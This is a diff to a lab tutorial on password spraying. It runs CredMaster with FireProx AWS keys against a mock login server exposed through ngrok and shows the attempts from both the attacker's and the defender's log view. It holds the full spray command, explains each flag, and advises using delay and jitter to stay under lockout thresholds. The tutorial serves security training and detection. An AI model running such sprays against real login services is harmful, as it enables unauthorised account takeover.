@@ -32,7 +32,7 @@ python3 mock_auth_server.py
 
 ## Open the Defender View
 
-Before spraying, open a **third terminal** to watch the server logs live - this is the blue team / analyst perspective:
+Before spraying, open a **second terminal** to watch the server logs live - this is the blue team / analyst perspective:
 
 ```bash
 tail -f /tmp/auth_server.log
@@ -84,8 +84,7 @@ Now this is REALLY IMPORTANT, save the **Access Key** and the **Secret access ke
 In Terminal 3, let's get the credentials for our spray
 
 ```bash
-sudo wget -O ~/Desktop/names.txt \
-  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt
+printf "aaron\nadam\nadmin\nalex\nalice\nandrew\nanna\nbarbara\nbrian\ncharles\nchris\ndavid\ndiana\nedward\nemma\n" > ~/Desktop/names.txt
 
 sudo wget -O ~/Desktop/top-passwords-shortlist.txt \
   https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-passwords-shortlist.txt
@@ -107,6 +106,11 @@ Now run:
 ngrok http 5000
 ```
 
+Grab that link, we will use that:
+
+<img width="1110" height="150" alt="2026-04-10_12-54" src="https://github.com/user-attachments/assets/aa41b775-11f9-4794-b10b-27eb1b2fcc85" />
+
+
 Finally open a **4th Terminal**
 
 Run the spray with your AWS Keys:
@@ -126,45 +130,40 @@ python3 credmaster.py \
   -p ~/Desktop/top-passwords-shortlist.txt \
   --access_key YOUR_AWS_KEY \
   --secret_access_key YOUR_AWS_SECRET \
-  --pluginargs url http://127.0.0.1:5000/auth/login content-type json \
-  --delay 1 \
-  --jitter 500
+  --pluginargs url YOUR_NGROK_DOMAIN/auth/login content-type json \
+  --delay 0 \
+  --jitter 0
 ```
 
 **What these flags do:**
 
 | Flag | Meaning |
 |------|---------|
-| `--plugin localtest` | Use our custom plugin |
-| `-u` | SecLists username file |
-| `-p` | SecLists password file |
-| `--nofire` | Skip AWS Lambda, run locally |
-| `--delay 1` | Wait 1 second between attempts |
-| `--jitter 500` | Add up to 500ms of random extra delay |
+| `--plugin httppost` | Use the built-in HTTP POST plugin |
+| `-u` | File containing usernames to spray |
+| `-p` | File containing passwords to try |
+| `--access_key` | AWS access key for FireProx API Gateway |
+| `--secret_access_key` | AWS secret key for FireProx API Gateway |
+| `--pluginargs url` | The target login endpoint (via ngrok) |
+| `--pluginargs content-type json` | Send the body as JSON |
+| `--delay 0` | No delay between attempts |
+| `--jitter 0` | No random extra delay |
 
 > The `--delay` and `--jitter` flags are critical in real engagements - they mimic human timing to stay under lockout thresholds. They also make the output easier to follow here.
 
 Watch **both perspectives** as it runs:
 
-**Attacker terminal** - CredMaster will find multiple hits since 15 accounts all share the same weak password:
-```
-[+] VALID CREDENTIALS: aaron:Password1
-[+] VALID CREDENTIALS: admin:Password1
-[+] VALID CREDENTIALS: alex:Password1
-[+] VALID CREDENTIALS: alice:Password1
-...
-```
+**Attacker terminal** - CredMaster will find multiple hits since 15 accounts all share the weak passwords:
+
+<img width="1067" height="862" alt="2026-04-10_13-21" src="https://github.com/user-attachments/assets/a3626ff1-6c82-4e03-9227-3716a2d18792" />
+
 
 **Defender terminal** - the log shows every attempt in real time:
-```
-2024-10-15 14:23:01 - [FAILED]  LOGIN ATTEMPT | IP: 127.0.0.1 | User: root | Pass: 123456
-2024-10-15 14:23:02 - [FAILED]  LOGIN ATTEMPT | IP: 127.0.0.1 | User: aaron | Pass: 123456
-2024-10-15 14:23:03 - [FAILED]  LOGIN ATTEMPT | IP: 127.0.0.1 | User: adam | Pass: 123456
-...
-2024-10-15 14:25:12 - [SUCCESS] LOGIN ATTEMPT | IP: 127.0.0.1 | User: aaron | Pass: Password1
-2024-10-15 14:25:44 - [SUCCESS] LOGIN ATTEMPT | IP: 127.0.0.1 | User: admin | Pass: Password1
-2024-10-15 14:26:01 - [SUCCESS] LOGIN ATTEMPT | IP: 127.0.0.1 | User: alice | Pass: Password1
-```
+
+<img width="1074" height="676" alt="2026-04-10_13-22" src="https://github.com/user-attachments/assets/c78f2398-a933-481c-b278-cd3ca1a5c5cb" />
+
+<img width="455" height="107" alt="2026-04-10_13-24" src="https://github.com/user-attachments/assets/2c294804-c931-4953-addb-6b65ca09b0e0" />
+
 
 The pattern is unmistakable from the defender's view: the **same IP cycling through hundreds of usernames, one password at a time, and hitting multiple accounts**. That is the signature of a spray - and exactly why a single weak password policy can compromise an entire organisation at once.
 
